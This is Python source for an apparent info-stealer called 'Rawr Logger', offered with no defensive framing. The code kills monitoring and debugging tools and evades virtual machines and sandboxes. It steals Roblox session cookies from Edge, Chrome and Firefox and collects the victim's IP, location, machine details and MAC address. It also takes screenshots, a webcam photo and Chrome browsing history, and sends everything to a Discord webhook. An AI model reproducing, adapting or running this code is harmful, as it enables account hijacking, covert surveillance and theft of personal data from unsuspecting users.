import os
import requests
import socket
import threading
import platform
import json
import psutil
import sys
import win32api
import browser_cookie3
import cv2
import re
import uuid
from PIL import ImageGrab
from browser_history.browsers import Chrome

webhook = "Webhooksss"

# List of suspicious processes to kill
processes_to_kill = [
    "ProcessHacker.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "HttpAnalyzerV7.exe",
    "fiddler.exe",
    "taskmgr.psutilexe",
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "ollydbg.exe",
    "dnSpy.exe",
    "procexp64.exe",
    "procexp.exe"
]

# Kill suspicious processes
for proc in psutil.process_iter():
    try:
        if proc.name() in processes_to_kill:
            proc.kill()
    except:
        pass

# Exit if VMware processes are running (VM detection)
vm_processes = ["VMwareService.exe", "VMwareTray.exe", "joeboxcontrol.exe", "vmwareuser.exe"]
for proc in psutil.process_iter():
    try:
        if proc.name() in vm_processes:
            sys.exit()
    except:
        pass

# Minimum disk size check to avoid VM/sandbox
minDiskSizeGB = 50
if len(sys.argv) > 1:
    try:
        minDiskSizeGB = float(sys.argv[1])
    except:
        pass

try:
    _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx(os.getenv("SystemDrive") + "\\")
    diskSizeGB = diskSizeBytes / 1073741824
except:
    diskSizeGB = 1000  # default large to avoid false positive if error

if diskSizeGB < minDiskSizeGB:
    try:
        embed_vm_detected = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {
                        "name": "Rawr Logger",
                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": "```VM Was Detected Couldnt Fetch Info```",
                }
            ]
        }
        requests.post(webhook, json=embed_vm_detected)
        os._exit(1)
    except:
        pass

# Gather machine info
machines = platform.uname()
try:
    ip = requests.get('https://api.ipify.org').text
    info = requests.get("http://ipinfo.io/json").json()
    city = info.get('city', 'Unknown')
    country = info.get('country', 'Unknown')
    region = info.get('region', 'Unknown')
    lang = info.get('loc', 'Unknown')
    postal = info.get('postal', 'Unknown')
    timezone = info.get('timezone', 'Unknown')
    org = info.get('org', 'Unknown')
except:
    ip = city = country = region = lang = postal = timezone = org = "Unknown"

pc_username = os.getenv("UserName")

embed_system_info = {
    "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
    "embeds": [
        {
            "author": {
                "name": "Rawr Logger",
                "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
            },
            "description": (
                f"@everyone You Got A Hit\n"
                f"```Public IP: {ip}```\n"
                f"```City: {city}```\n"
                f"```Country: {country}```\n"
                f"```Region: {region}```\n"
                f"```Coordinates: {lang}```\n"
                f"```Postal Code: {postal}```\n"
                f"```Timezone: {timezone}```\n"
                f"```Organization: {org}```\n"
                f"```PC Username: {pc_username}```\n"
                f"```Machine Name: {machines.node}```\n"
                f"```Processor: {machines.processor}```\n"
                f"```MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```"
            )
        }
    ]
}
try:
    requests.post(webhook, json=embed_system_info)
except:
    pass

# Helper function to extract Roblox .ROBLOSECURITY cookie from a browser_cookie3 object
def extract_roblox_cookie(cookies):
    try:
        cookie_str = str(cookies)
        # Look for .ROBLOSECURITY cookie exactly
        if ".ROBLOSECURITY=" in cookie_str:
            # Extract between .ROBLOSECURITY= and the next space or end
            # browser_cookie3 formats cookies with 'for' at the end, so split accordingly
            cookie = cookie_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            return cookie
    except:
        pass
    return None

# Function to grab Roblox cookie and user info from Edge
def grab_edge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        roblox_cookie = extract_roblox_cookie(cookies)
        if roblox_cookie:
            info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie})
            if info.status_code == 200:
                data = info.json()
                embed = {
                    "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                    "embeds": [
                        {
                            "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                            "description": (
                                f"```Roblox Cookie: {roblox_cookie}```\n"
                                f"Roblox Username: {data.get('UserName','N/A')}\n"
                                f"Roblox UserID: {data.get('UserID','N/A')}\n"
                                f"Robux Balance: {data.get('RobuxBalance','N/A')}\n"
                                f"Premium: {data.get('IsPremium','N/A')}\n"
                                f"Thumbnail URL: {data.get('ThumbnailUrl','N/A')}"
                            ),
                            "footer": {"text": "Rawr Logger Made By Jose And The Soap1"}
                        }
                    ]
                }
                requests.post(webhook, json=embed)
            else:
                raise Exception("Failed to fetch Roblox user info")
        else:
            raise Exception("Roblox cookie not found")
    except:
        embed = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                    "description": "```Roblox Edge Cookie Was Not Found```"
                }
            ]
        }
        requests.post(webhook, json=embed)

# Function to grab Roblox cookie and user info from Chrome
def grab_chrome():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        roblox_cookie = extract_roblox_cookie(cookies)
        if roblox_cookie:
            info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie})
            if info.status_code == 200:
                data = info.json()
                embed = {
                    "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                    "embeds": [
                        {
                            "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                            "description": (
                                f"```Roblox Cookie: {roblox_cookie}```\n"
                                f"Roblox Username: {data.get('UserName','N/A')}\n"
                                f"Roblox UserID: {data.get('UserID','N/A')}\n"
                                f"Robux Balance: {data.get('RobuxBalance','N/A')}\n"
                                f"Premium: {data.get('IsPremium','N/A')}\n"
                                f"Thumbnail URL: {data.get('ThumbnailUrl','N/A')}"
                            ),
                            "footer": {"text": "Rawr Logger Made By Jose And The Soap1"}
                        }
                    ]
                }
                requests.post(webhook, json=embed)
            else:
                raise Exception("Failed to fetch Roblox user info")
        else:
            raise Exception("Roblox cookie not found")
    except:
        embed = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                    "description": "```Roblox Google Chrome Cookie Was Not Found```"
                }
            ]
        }
        requests.post(webhook, json=embed)

# Function to grab Roblox cookie and user info from Firefox
def grab_firefox():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        roblox_cookie = extract_roblox_cookie(cookies)
        if roblox_cookie:
            info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie})
            if info.status_code == 200:
                data = info.json()
                embed = {
                    "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                    "embeds": [
                        {
                            "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                            "description": (
                                f"```Roblox Cookie: {roblox_cookie}```\n"
                                f"Roblox Username: {data.get('UserName','N/A')}\n"
                                f"Roblox UserID: {data.get('UserID','N/A')}\n"
                                f"Robux Balance: {data.get('RobuxBalance','N/A')}\n"
                                f"Premium: {data.get('IsPremium','N/A')}\n"
                                f"Thumbnail URL: {data.get('ThumbnailUrl','N/A')}"
                            ),
                            "footer": {"text": "Rawr Logger Made By Jose And The Soap1"}
                        }
                    ]
                }
                requests.post(webhook, json=embed)
            else:
                raise Exception("Failed to fetch Roblox user info")
        else:
            raise Exception("Roblox cookie not found")
    except:
        embed = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                    "description": "```Roblox Firefox Cookie Was Not Found```"
                }
            ]
        }
        requests.post(webhook, json=embed)

# Start threads for cookie grabbing on multiple browsers
browsers = [grab_firefox, grab_edge, grab_chrome]
for func in browsers:
    threading.Thread(target=func).start()

# Take screenshot
try:
    screenshot = ImageGrab.grab(all_screens=True)
    screenshot.save("image.png")
    screenshot.close()
    with open('image.png', 'rb') as f:
        requests.post(webhook, files={'upload_file': f})
    os.remove('image.png')
except:
    pass

# Capture webcam photo
try:
    videoCaptureObject = cv2.VideoCapture(0)
    ret, frame = videoCaptureObject.read()
    if ret:
        cv2.imwrite("photo.png", frame)
        with open('photo.png', 'rb') as f:
            requests.post(webhook, json={'content': 'Picture Of Their Webcam:'})
            requests.post(webhook, files={'upload_file': f})
        os.remove('photo.png')
    videoCaptureObject.release()
except:
    embed = {
        "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
        "embeds": [
            {
                "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                "description": "```No Webcam Was Found```"
            }
        ]
    }
    try:
        requests.post(webhook, json=embed)
    except:
        pass

# Grab Chrome browser history and send
try:
    file = Chrome()
    outputs = file.fetch_history()
    with open("history.txt", "w", encoding="utf-8") as file:
        file.write(repr(outputs.histories))
    with open('history.txt', 'rb') as f:
        requests.post(webhook, json={'content': 'Their Chrome History:'})
        requests.post(webhook, files={'upload_file': f})
    os.remove('history.txt')
except:
    embed = {
        "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
        "embeds": [
            {
                "author": {"icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
                "description": "```Failed To Grab Chrome Browser History```"
            }
        ]
    }
    try:
        requests.post(webhook, json=embed)
    except:
        pass
